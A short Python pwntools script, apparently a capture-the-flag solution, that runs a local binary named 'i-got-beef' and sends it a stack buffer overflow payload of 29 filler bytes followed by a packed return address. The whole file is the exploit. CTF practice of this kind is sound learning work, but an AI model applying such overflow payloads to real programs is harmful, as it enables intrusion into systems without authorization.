from pwn import *

payload = 'A'*29+p32(0x0804852b)

p = process('./i-got-beef')
print p.recv()
print p.recv()
p.sendline(payload)
